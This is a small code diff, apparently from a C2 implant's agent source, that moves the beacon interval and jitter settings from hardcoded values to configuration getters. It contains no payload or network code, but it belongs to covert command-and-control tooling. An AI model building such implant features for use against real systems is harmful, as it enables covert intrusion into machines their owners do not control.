@@ -1,4 +1,5 @@
 #include "Agent.h"
+#include "AgentConfig.h"
 #include "Commands.h"
 #include <iostream>
 #include <thread>
@@ -7,7 +8,7 @@
 #include <unordered_map>
 
 Agent::Agent()
-	: BeaconIntervalMs(5000), BeaconJitterMs(1000)
+	: BeaconIntervalMs(GetBeaconSleepMs()), BeaconJitterMs(GetBeaconJitterMs())
 {
 	Commands = loadCommands();
 	Metadata = generateMetadata();
